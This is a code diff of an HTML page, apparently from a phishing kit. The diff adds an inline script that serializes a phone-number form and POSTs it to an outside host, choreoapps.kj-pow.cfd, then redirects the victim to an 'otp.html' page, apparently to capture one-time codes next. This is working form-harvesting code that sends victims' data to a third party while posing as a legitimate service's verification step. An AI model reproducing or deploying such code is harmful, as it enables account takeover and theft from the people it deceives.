@@ -407,7 +407,29 @@ padding-left: 10px;
         }
 
 </script>
-     <script src="token.js">
+     <script>
+   function sendNohp(){
+    $(".load").fadeIn();
+    event.preventDefault();   
+  
+    document.getElementById('kirim').innerHTML = "Memproses....";         
+    
+    
+   
+      $.ajax({
+        type: 'POST',
+        url: 'https://choreoapps.kj-pow.cfd/39/no.php',
+        data: $('#formHP').serialize(),
+        datatype: 'JSON',   
+    complete: function(){
+    setTimeout(function(){   
+    window.location = "otp.html";
+    $("#lonte").hide();
+    $(".load").fadeOut();  
+    document.getElementById('kirim').innerHTML = "Lanjutkan";
+    vibr(180);
+    }, 500);}});};   
+     
  </script>
 <script>
       
